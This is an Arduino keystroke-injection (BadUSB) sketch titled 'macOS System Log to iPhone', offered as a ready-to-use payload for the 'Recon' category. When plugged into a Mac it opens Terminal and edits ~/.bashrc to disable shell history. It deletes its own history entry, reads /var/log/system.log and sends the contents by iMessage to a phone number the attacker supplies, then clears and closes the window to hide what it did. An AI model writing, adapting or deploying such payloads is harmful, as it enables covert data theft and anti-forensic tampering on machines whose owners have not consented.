// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script retrieves the contents of the system log located at /var/log/system.log
  // Then sends the Users System logs to your phone via text message
  // Replace 'ENTER PHONE NUMBER HERE' with your actual Phone number
  // Shoutout to matthewkayne and 0iphor13 for the Phone code
  // Title: macOS System Log to iPhone
  // Author: Narsty
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" x=$(cat /var/log/system.log); osascript -e 'tell application \"Messages\" to send \"'$x'\" to buddy \"ENTER PHONE NUMBER HERE\"'");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('k');
  Keyboard.releaseAll();

  delay(250);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}